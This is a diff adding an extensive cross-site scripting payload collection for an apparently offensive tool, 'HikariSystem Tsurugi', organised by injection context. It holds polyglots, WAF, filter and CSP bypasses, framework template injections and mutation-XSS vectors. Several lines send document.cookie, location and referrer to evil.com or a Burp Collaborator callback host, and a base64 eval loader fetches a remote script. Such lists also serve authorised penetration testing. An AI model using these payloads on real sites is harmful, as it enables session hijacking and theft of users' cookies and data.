@@ -1,7 +1,518 @@
-<script>alert('TSURUGI_XSS_TEST')</script>
-"><script>alert('TSURUGI_XSS_TEST')</script>
-<img src=x onerror=alert('TSURUGI_XSS_TEST')>
-';alert('TSURUGI_XSS_TEST');//
-javascript:alert('TSURUGI_XSS_TEST')
-<svg/onload=alert('TSURUGI_XSS_TEST')>
-<body onload=alert('TSURUGI_XSS_TEST')>
+<!-- ============================================================================ -->
+<!-- HikariSystem Tsurugi - XSS Research Module v3.0                             -->
+<!-- Focus: Context-Aware Injection, WAF Bypass, Modern Framework Exploitation   -->
+<!-- Last Updated: 2026-01-15 | Maintainer: ThreatBiih & LXrdKnowkill             -->
+<!-- ============================================================================ -->
+
+<!-- ============================================================================ -->
+<!-- [SECTION 1] POLYGLOT XSS (Universal Context Breakers)                       -->
+<!-- ============================================================================ -->
+<!-- These work across HTML, JS, and attribute contexts simultaneously.          -->
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></xmp></template></tablewrap></plaintext><svg/onload=/*<html/*/onmouseover=alert()//>
+'">><svg/onload=alert()//>
+-->'"/></sCript><dETAILS%0teleported%0teleported><img%20teleported%00teleported%23teleported%24teleported%26teleported'teleported"teleported>teleported<%00teleported script>teleported alert(1)teleported</script>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 2] HTML CONTEXT (Tag Injection)                                    -->
+<!-- ============================================================================ -->
+<!-- For injection into HTML body where we can create new tags.                  -->
+
+<!-- Basic Script Injection -->
+<script>alert('TSURUGI')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script src=//evil.com/x.js></script>
+<script/src=//evil.com/x.js></script>
+
+<!-- Event Handler Tags -->
+<img src=x onerror=alert('TSURUGI')>
+<img/src=x onerror=alert('TSURUGI')>
+<img src=x onerror="alert('TSURUGI')">
+<img src=x onerror='alert(`TSURUGI`)'>
+<svg onload=alert('TSURUGI')>
+<svg/onload=alert('TSURUGI')>
+<svg onload="alert('TSURUGI')">
+<body onload=alert('TSURUGI')>
+<body/onload=alert('TSURUGI')>
+<input onfocus=alert('TSURUGI') autofocus>
+<input/onfocus=alert('TSURUGI')/autofocus>
+<marquee onstart=alert('TSURUGI')>
+<video src=x onerror=alert('TSURUGI')>
+<audio src=x onerror=alert('TSURUGI')>
+<details open ontoggle=alert('TSURUGI')>
+<details/open/ontoggle=alert('TSURUGI')>
+<iframe src="javascript:alert('TSURUGI')">
+<iframe/src="javascript:alert('TSURUGI')">
+<object data="javascript:alert('TSURUGI')">
+<embed src="javascript:alert('TSURUGI')">
+<math><maction xlink:href="javascript:alert('TSURUGI')">click</maction></math>
+
+<!-- Less Common Tags (WAF Bypass) -->
+<isindex action=javascript:alert('TSURUGI')>
+<form><button formaction=javascript:alert('TSURUGI')>X</button></form>
+<form><input type=submit formaction=javascript:alert('TSURUGI')>
+<xss onclick=alert('TSURUGI')>click</xss>
+<x onclick=alert('TSURUGI')>click</x>
+<image src=x onerror=alert('TSURUGI')>
+<animate onbegin=alert('TSURUGI')>
+<set onbegin=alert('TSURUGI')>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 3] ATTRIBUTE CONTEXT (Breaking Out)                               -->
+<!-- ============================================================================ -->
+<!-- For injection into attribute values. Focus on breaking quotes and context.  -->
+
+<!-- Double Quote Context -->
+"><script>alert('TSURUGI')</script>
+"><img src=x onerror=alert('TSURUGI')>
+"><svg onload=alert('TSURUGI')>
+" onfocus=alert('TSURUGI') autofocus="
+" onmouseover=alert('TSURUGI') x="
+" onclick=alert('TSURUGI') x="
+"onmouseover="alert('TSURUGI')
+"onfocus="alert('TSURUGI')"autofocus="
+
+<!-- Single Quote Context -->
+'><script>alert('TSURUGI')</script>
+'><img src=x onerror=alert('TSURUGI')>
+'><svg onload=alert('TSURUGI')>
+' onfocus=alert('TSURUGI') autofocus='
+' onmouseover=alert('TSURUGI') x='
+' onclick=alert('TSURUGI') x='
+'onmouseover='alert(`TSURUGI`)
+'onfocus='alert(`TSURUGI`)'autofocus='
+
+<!-- Unquoted Attribute Context -->
+x onfocus=alert('TSURUGI') autofocus
+x onmouseover=alert('TSURUGI')
+x onclick=alert('TSURUGI')
+
+<!-- Event Handlers Without Quotes -->
+"autofocus/onfocus="alert('TSURUGI')
+'autofocus/onfocus='alert(`TSURUGI`)
+
+<!-- ============================================================================ -->
+<!-- [SECTION 4] JAVASCRIPT CONTEXT (String Breakout)                           -->
+<!-- ============================================================================ -->
+<!-- For injection into JavaScript string literals or code blocks.               -->
+
+<!-- String Literal Breakout (Double Quote) -->
+";alert('TSURUGI');//
+";alert('TSURUGI');"
+"-alert('TSURUGI')-"
+"+alert('TSURUGI')+"
+"*alert('TSURUGI')*"
+"</script><script>alert('TSURUGI')</script>
+"\x3cscript\x3ealert('TSURUGI')\x3c/script\x3e
+
+<!-- String Literal Breakout (Single Quote) -->
+';alert('TSURUGI');//
+';alert('TSURUGI');'
+'-alert('TSURUGI')-'
+'+alert('TSURUGI')+'
+'</script><script>alert('TSURUGI')</script>
+'\x3cscript\x3ealert('TSURUGI')\x3c/script\x3e
+
+<!-- Template Literal Breakout (Backtick) -->
+`;alert('TSURUGI');//
+`-alert('TSURUGI')-`
+${alert('TSURUGI')}
+`${alert('TSURUGI')}`
+
+<!-- Object/JSON Context -->
+}alert('TSURUGI');{
+}; alert('TSURUGI');//
+},"x":alert('TSURUGI'),"y":{"z":"
+
+<!-- ============================================================================ -->
+<!-- [SECTION 5] URL/HREF CONTEXT (Protocol Injection)                          -->
+<!-- ============================================================================ -->
+<!-- For injection into href, src, action, and similar URL attributes.          -->
+
+javascript:alert('TSURUGI')
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+javascript://%0Aalert('TSURUGI')
+javascript://comment%0Aalert('TSURUGI')
+javascript:/*comment*/alert('TSURUGI')
+
+<!-- Case Bypass -->
+jAvAsCrIpT:alert('TSURUGI')
+JaVaScRiPt:alert('TSURUGI')
+JAVASCRIPT:alert('TSURUGI')
+
+<!-- Protocol with Encoding -->
+java%0ascript:alert('TSURUGI')
+java%0dscript:alert('TSURUGI')
+java%09script:alert('TSURUGI')
+java%00script:alert('TSURUGI')
+
+<!-- Data URIs -->
+data:text/html,<script>alert('TSURUGI')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnVFNVUlVHSScpPC9zY3JpcHQ+
+data:text/html,<img src=x onerror=alert('TSURUGI')>
+
+<!-- VBScript (IE Legacy) -->
+vbscript:msgbox('TSURUGI')
+vbscript:Execute("MsgBox(""TSURUGI"")")
+
+<!-- ============================================================================ -->
+<!-- [SECTION 6] CSS CONTEXT (Style Injection)                                  -->
+<!-- ============================================================================ -->
+<!-- For injection into style attributes or style blocks.                        -->
+
+</style><script>alert('TSURUGI')</script>
+</style><img src=x onerror=alert('TSURUGI')>
+expression(alert('TSURUGI'))
+background:url(javascript:alert('TSURUGI'))
+</style><svg/onload=alert('TSURUGI')>
+
+<!-- CSS-based Data Exfiltration (Side Channel) -->
+</style><style>@import url('http://evil.com/log?data='+document.cookie);</style>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 7] SVG CONTEXT                                                    -->
+<!-- ============================================================================ -->
+<!-- SVG-specific XSS vectors for XML parsing contexts.                          -->
+
+<svg><script>alert('TSURUGI')</script></svg>
+<svg onload=alert('TSURUGI')>
+<svg/onload=alert('TSURUGI')>
+<svg><animate onbegin=alert('TSURUGI')>
+<svg><set onbegin=alert('TSURUGI')>
+<svg><handler ev:event="load" xmlns:ev="http://www.w3.org/2001/xml-events">alert('TSURUGI')</handler></svg>
+<svg><foreignObject><iframe srcdoc="<script>alert('TSURUGI')</script>"></foreignObject></svg>
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert('TSURUGI')"><rect width=100 height=100/></a></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert('TSURUGI')</script></svg>#x">
+
+<!-- ============================================================================ -->
+<!-- [SECTION 8] DOM-BASED XSS (Sink Injection)                                 -->
+<!-- ============================================================================ -->
+<!-- Payloads targeting common DOM sinks like innerHTML, eval, etc.              -->
+
+<!-- innerHTML/outerHTML Sinks -->
+<img src=x onerror=alert('TSURUGI')>
+<svg onload=alert('TSURUGI')>
+<iframe srcdoc="<script>alert('TSURUGI')</script>">
+
+<!-- eval/setTimeout/setInterval Sinks -->
+alert('TSURUGI')
+alert`TSURUGI`
+eval('alert("TSURUGI")')
+(function(){alert('TSURUGI')})()
+[].constructor.constructor('alert("TSURUGI")')()
+
+<!-- document.write Sink -->
+<script>alert('TSURUGI')</script>
+</script><script>alert('TSURUGI')</script>
+
+<!-- location Sinks -->
+javascript:alert('TSURUGI')
+//evil.com/
+/\evil.com
+
+<!-- ============================================================================ -->
+<!-- [SECTION 9] WAF BYPASS TECHNIQUES                                          -->
+<!-- ============================================================================ -->
+<!-- Evasion techniques for common WAF implementations.                          -->
+
+<!-- Case Mixing -->
+<ScRiPt>alert('TSURUGI')</sCrIpT>
+<sCrIpT>alert('TSURUGI')</ScRiPt>
+<IMG SRC=x ONERROR=alert('TSURUGI')>
+<iMg SrC=x OnErRoR=alert('TSURUGI')>
+
+<!-- Null Bytes -->
+<scr%00ipt>alert('TSURUGI')</scr%00ipt>
+<img%00src=x%00onerror=alert('TSURUGI')>
+<script%00>alert('TSURUGI')</script>
+
+<!-- HTML Entity Encoding -->
+<script>&#97;&#108;&#101;&#114;&#116;('TSURUGI')</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;('TSURUGI')</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;('TSURUGI')">
+
+<!-- Double Encoding -->
+%253Cscript%253Ealert('TSURUGI')%253C%252Fscript%253E
+%26lt;script%26gt;alert('TSURUGI')%26lt;/script%26gt;
+
+<!-- Unicode Encoding -->
+<script>\u0061\u006c\u0065\u0072\u0074('TSURUGI')</script>
+<script>\u{61}\u{6c}\u{65}\u{72}\u{74}('TSURUGI')</script>
+
+<!-- Whitespace Variants -->
+<script	>alert('TSURUGI')</script>
+<script
+>alert('TSURUGI')</script>
+<script >alert('TSURUGI')</script>
+<img/src=x/onerror=alert('TSURUGI')>
+<svg/onload=alert('TSURUGI')>
+
+<!-- Comment Insertion -->
+<scr<!--comment-->ipt>alert('TSURUGI')</scr<!--comment-->ipt>
+<script>/*comment*/alert('TSURUGI')/*comment*/</script>
+
+<!-- Tag Manipulation -->
+<script/x>alert('TSURUGI')</script>
+<script x>alert('TSURUGI')</script>
+<script/random>alert('TSURUGI')</script>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 10] FILTER BYPASS (Specific Keywords)                             -->
+<!-- ============================================================================ -->
+<!-- When specific functions or keywords are blocked.                            -->
+
+<!-- alert() Bypass -->
+confirm('TSURUGI')
+prompt('TSURUGI')
+console.log('TSURUGI')
+document.write('TSURUGI')
+eval('al'+'ert("TSURUGI")')
+window['al'+'ert']('TSURUGI')
+top['al'+'ert']('TSURUGI')
+self['al'+'ert']('TSURUGI')
+this['al'+'ert']('TSURUGI')
+frames['al'+'ert']('TSURUGI')
+[].constructor.constructor('return alert("TSURUGI")')()
+(function(){return this})()['ale'+'rt']('TSURUGI')
+Reflect.apply(alert,null,['TSURUGI'])
+Reflect['apply'](alert,null,['TSURUGI'])
+new Function('alert("TSURUGI")')()
+setTimeout('alert("TSURUGI")',0)
+setInterval('alert("TSURUGI")',0)
+
+<!-- Parentheses () Bypass -->
+alert`TSURUGI`
+onerror=alert;throw'TSURUGI'
+{onerror=alert}throw'TSURUGI'
+<svg/onload=alert`TSURUGI`>
+<img src=x onerror=alert`TSURUGI`>
+location=name
+
+<!-- Script Tag Bypass -->
+<img src=x onerror=alert('TSURUGI')>
+<svg onload=alert('TSURUGI')>
+<body onload=alert('TSURUGI')>
+<input onfocus=alert('TSURUGI') autofocus>
+<marquee onstart=alert('TSURUGI')>
+<video><source onerror=alert('TSURUGI')>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 11] MODERN FRAMEWORK BYPASS                                       -->
+<!-- ============================================================================ -->
+<!-- Bypasses for Angular, React, Vue, and other modern frameworks.             -->
+
+<!-- Angular (Template Injection) -->
+{{constructor.constructor('alert("TSURUGI")')()}}
+{{$on.constructor('alert("TSURUGI")')()}}
+{{$eval.constructor('alert("TSURUGI")')()}}
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+<input ng-focus=$event.path|orderBy:'[].constructor.from([1],alert)'>
+
+<!-- Vue.js -->
+{{constructor.constructor('alert("TSURUGI")')()}}
+{{_c.constructor('alert("TSURUGI")')()}}
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+
+<!-- React (dangerouslySetInnerHTML) -->
+<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert("TSURUGI")>'}}></div>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 12] MUTATION XSS (mXSS)                                           -->
+<!-- ============================================================================ -->
+<!-- Exploits browser HTML parsing quirks after sanitization.                    -->
+
+<listing>&lt;img src=x onerror=alert('TSURUGI')&gt;</listing>
+<noscript><p title="</noscript><img src=x onerror=alert('TSURUGI')>">
+<math><mtext><table><mglyph><style><img src=x onerror=alert('TSURUGI')>
+<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert('TSURUGI')>
+<svg><![CDATA[><img src=x onerror=alert('TSURUGI')>]]>
+<svg></p><style><g/onload=alert('TSURUGI')>
+<p id="</p><script>alert('TSURUGI')</script>">
+
+<!-- ============================================================================ -->
+<!-- [SECTION 13] BLIND XSS (Callback Payloads)                                 -->
+<!-- ============================================================================ -->
+<!-- For stored XSS scenarios where execution happens elsewhere (admin panels). -->
+<!-- Replace BURP-COLLABORATOR-ID with your actual callback server.             -->
+
+<script src=https://BURP-COLLABORATOR-ID.oastify.com></script>
+<img src=x onerror="(new Image()).src='https://BURP-COLLABORATOR-ID.oastify.com/?c='+document.cookie">
+<img src=x onerror="fetch('https://BURP-COLLABORATOR-ID.oastify.com/?c='+document.cookie)">
+<script>new Image().src='https://BURP-COLLABORATOR-ID.oastify.com/?c='+encodeURIComponent(document.cookie);</script>
+<script>fetch('https://BURP-COLLABORATOR-ID.oastify.com/?c='+document.cookie)</script>
+"><script src=https://BURP-COLLABORATOR-ID.oastify.com></script>
+'><script src=https://BURP-COLLABORATOR-ID.oastify.com></script>
+<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3lhcmlueCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs onerror=eval(atob(this.id))>
+
+<!-- With Location/Referer Exfiltration -->
+<script>new Image().src="https://BURP-COLLABORATOR-ID.oastify.com/?c="+document.cookie+"&l="+location.href+"&r="+document.referrer;</script>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 14] ADVANCED EVENT HANDLERS                                       -->
+<!-- ============================================================================ -->
+<!-- Comprehensive list of event handlers for different contexts.                -->
+
+<!-- Mouse Events -->
+<x onmouseover=alert('TSURUGI')>hover</x>
+<x onmouseenter=alert('TSURUGI')>hover</x>
+<x onmousemove=alert('TSURUGI')>hover</x>
+<x onmousedown=alert('TSURUGI')>click</x>
+<x onmouseup=alert('TSURUGI')>click</x>
+<x onclick=alert('TSURUGI')>click</x>
+<x ondblclick=alert('TSURUGI')>dblclick</x>
+<x oncontextmenu=alert('TSURUGI')>rightclick</x>
+<x onwheel=alert('TSURUGI')>scroll</x>
+
+<!-- Focus Events -->
+<input onfocus=alert('TSURUGI') autofocus>
+<input onblur=alert('TSURUGI') autofocus><input autofocus>
+<select onfocus=alert('TSURUGI') autofocus>
+<textarea onfocus=alert('TSURUGI') autofocus>
+<keygen onfocus=alert('TSURUGI') autofocus>
+
+<!-- Form Events -->
+<form onsubmit=alert('TSURUGI')><input type=submit>
+<form onreset=alert('TSURUGI')><input type=reset>
+<input oninput=alert('TSURUGI')>
+<input onchange=alert('TSURUGI')>
+<input oninvalid=alert('TSURUGI') required><input type=submit>
+
+<!-- Media Events -->
+<video onloadstart=alert('TSURUGI')><source src=x>
+<video onprogress=alert('TSURUGI')><source src=x>
+<video onloadedmetadata=alert('TSURUGI')><source src=x>
+<video onloadeddata=alert('TSURUGI')><source src=x>
+<video oncanplay=alert('TSURUGI')><source src=x>
+<video oncanplaythrough=alert('TSURUGI')><source src=x>
+<video ondurationchange=alert('TSURUGI')><source src=x>
+<audio onerror=alert('TSURUGI')><source src=x>
+
+<!-- Document/Window Events -->
+<body onload=alert('TSURUGI')>
+<body onpageshow=alert('TSURUGI')>
+<body onresize=alert('TSURUGI')><script>window.resizeTo(100,100)</script>
+<body onscroll=alert('TSURUGI')><div style="height:2000px"></div><script>scroll(0,100)</script>
+<body onhashchange=alert('TSURUGI')><a href=#x id=x>click</a>
+<body onpopstate=alert('TSURUGI')><script>history.pushState('','','#')</script>
+
+<!-- Misc Events -->
+<marquee onstart=alert('TSURUGI')>
+<marquee onfinish=alert('TSURUGI') loop=1>
+<marquee onbounce=alert('TSURUGI')>
+<details open ontoggle=alert('TSURUGI')>
+<dialog open onclose=alert('TSURUGI')><script>document.querySelector('dialog').close()</script>
+<menu id=x contextmenu=x onshow=alert('TSURUGI')>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 15] ENCODING & OBFUSCATION                                        -->
+<!-- ============================================================================ -->
+<!-- Various encoding techniques for payload obfuscation.                        -->
+
+<!-- HTML Entities (Decimal) -->
+&#60;script&#62;alert('TSURUGI')&#60;/script&#62;
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#84;&#83;&#85;&#82;&#85;&#71;&#73;&#39;&#41;">
+
+<!-- HTML Entities (Hex) -->
+&#x3c;script&#x3e;alert('TSURUGI')&#x3c;/script&#x3e;
+<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x54;&#x53;&#x55;&#x52;&#x55;&#x47;&#x49;&#x27;&#x29;">
+
+<!-- JavaScript Unicode -->
+<script>\u0061\u006c\u0065\u0072\u0074('TSURUGI')</script>
+<script>eval('\u0061\u006c\u0065\u0072\u0074("TSURUGI")')</script>
+
+<!-- JavaScript Hex -->
+<script>eval('\x61\x6c\x65\x72\x74("TSURUGI")')</script>
+
+<!-- JavaScript Octal -->
+<script>eval('\141\154\145\162\164("TSURUGI")')</script>
+
+<!-- Base64 -->
+<script>eval(atob('YWxlcnQoJ1RTVVJVR0knKQ=='))</script>
+<img src=x onerror="eval(atob('YWxlcnQoJ1RTVVJVR0knKQ=='))">
+
+<!-- String.fromCharCode -->
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,84,83,85,82,85,71,73,39,41))</script>
+
+<!-- JSFuck (Obfuscated) -->
+<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+...</script>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 16] SPECIAL CONTEXTS                                              -->
+<!-- ============================================================================ -->
+<!-- Context-specific payloads for unique situations.                            -->
+
+<!-- Markdown Injection -->
+[Click](javascript:alert('TSURUGI'))
+![alt](x"onerror="alert('TSURUGI'))
+<script>alert('TSURUGI')</script>
+
+<!-- JSON Injection -->
+{"x":"<img src=x onerror=alert('TSURUGI')>"}
+{"x":"</script><script>alert('TSURUGI')</script>"}
+
+<!-- XML Injection -->
+<![CDATA[<script>alert('TSURUGI')</script>]]>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert('TSURUGI')</x:script>
+
+<!-- PDF XSS -->
+app.alert('TSURUGI')
+
+<!-- SVG File Upload -->
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert('TSURUGI')" xmlns="http://www.w3.org/2000/svg"></svg>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 17] CSP BYPASS                                                    -->
+<!-- ============================================================================ -->
+<!-- For bypassing Content Security Policy restrictions.                         -->
+
+<!-- JSONP Callback -->
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert('TSURUGI')"></script>
+<script src="https://www.google.com/complete/search?client=chrome&q=a&callback=alert"></script>
+
+<!-- Base Tag Hijacking -->
+<base href="https://evil.com/">
+
+<!-- Angular CSP Bypass -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert("TSURUGI")')()}}</div>
+
+<!-- script-src 'unsafe-eval' -->
+<script>eval('alert("TSURUGI")')</script>
+<script>new Function('alert("TSURUGI")'))()</script>
+
+<!-- script-src 'unsafe-inline' -->
+<script>alert('TSURUGI')</script>
+<img src=x onerror=alert('TSURUGI')>
+
+<!-- ============================================================================ -->
+<!-- [SECTION 18] DETECTION/FINGERPRINTING                                      -->
+<!-- ============================================================================ -->
+<!-- Minimal payloads for vulnerability detection without full exploitation.     -->
+
+<!-- Quick Detection (Visible) -->
+<TSURUGI>
+<tsurugi>
+"TSURUGI
+'TSURUGI
+`TSURUGI
+<script>TSURUGI</script>
+"><TSURUGI
+'><TSURUGI
+
+<!-- Quick Detection (Non-Visible, check source) -->
+<!--TSURUGI-->
+"<!--TSURUGI
+'<!--TSURUGI
+
+<!-- Character Reflection Test -->
+<>'"`;(){}[]
+&lt;&gt;&apos;&quot;
+
+<!-- ============================================================================ -->
+<!-- END OF RESEARCH MODULE                                                     -->
+<!-- Total Documented Vectors: ~250+ (Quality over Quantity)                    -->
+<!-- Each section targets specific exploitation contexts                        -->
+<!-- ============================================================================ -->
